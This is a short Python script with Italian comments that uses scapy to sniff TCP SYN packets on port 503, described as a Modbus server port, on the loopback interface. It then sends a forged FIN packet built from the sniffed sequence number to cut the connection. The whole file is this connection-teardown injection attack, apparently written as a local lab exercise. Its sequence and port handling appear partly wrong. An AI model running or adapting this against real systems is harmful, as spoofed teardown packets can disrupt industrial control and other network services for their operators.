from scapy.all import sniff, IP, TCP, send

# Funzione per sniffare il pacchetto SYN e ottenere il numero di sequenza
def packet_callback(packet):
    if packet.haslayer(TCP) and packet[TCP].flags == "S":  # Connessione SYN
        seq_num = packet[TCP].seq
        print(f"Numero di sequenza iniziale (SYN): {seq_num}")
        
        # Dopo aver ottenuto il numero di sequenza, invia un pacchetto FIN
        send_fin_packet('localhost', packet[TCP].sport, seq_num)

# Funzione per inviare un pacchetto TCP con il flag FIN
def send_fin_packet(ip, port, seq_num):
    """
    Invia un pacchetto TCP con il flag FIN per terminare la connessione con il server.
    :param ip: Indirizzo IP del server (es. '127.0.0.1')
    :param port: Porta del server Modbus (es. 503)
    :param seq_num: Numero di sequenza ottenuto dallo sniffing
    """
    # Crea il pacchetto IP e TCP con il flag FIN
    fin_packet = IP(src="127.0.0.1", dst=ip) / TCP(sport=port, dport=503, flags="F", seq=seq_num)
    
    # Invia il pacchetto
    send(fin_packet)
    print(f"[+] Pacchetto FIN inviato a {ip}:{port} con numero di sequenza {seq_num} per terminare la connessione.")

# Sniffing dei pacchetti sulla porta 503 per ottenere il numero di sequenza
sniff(iface="Software Loopback Interface 1", prn=packet_callback, filter="tcp port 503")